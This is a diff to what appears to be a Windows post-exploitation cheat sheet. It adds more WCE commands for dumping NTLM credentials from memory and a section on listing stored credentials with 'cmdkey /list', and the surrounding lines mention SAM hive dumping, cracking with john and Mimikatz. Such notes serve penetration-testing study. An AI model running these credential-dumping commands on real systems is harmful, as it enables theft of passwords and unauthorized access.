@@ -299,7 +299,9 @@ WCE can steal NTLM passwords from memory in cleartext! There are different versi
 
 You can run it like this:
 ```
+wce32.exe
 wce32.exe -w
+wce32.exe -l
 ```
 
 ## Hives
@@ -370,6 +372,17 @@ samdump2 SYSTEM SAM -o sam.txt
 Then crack it with `john -format=NT /root/sam.txt`.
 
 ## Passwords
+
+## Stored credentials
+
+Use the `cmdkey` to list the stored credentials on the machine:
+```
+cmdkey /list
+Currently stored credentials:
+ Target: Domain:interactive=WORKGROUP\Administrator
+ Type: Domain Password
+ User: WORKGROUP\Administrator
+```
 
 ### Mimikatz
 
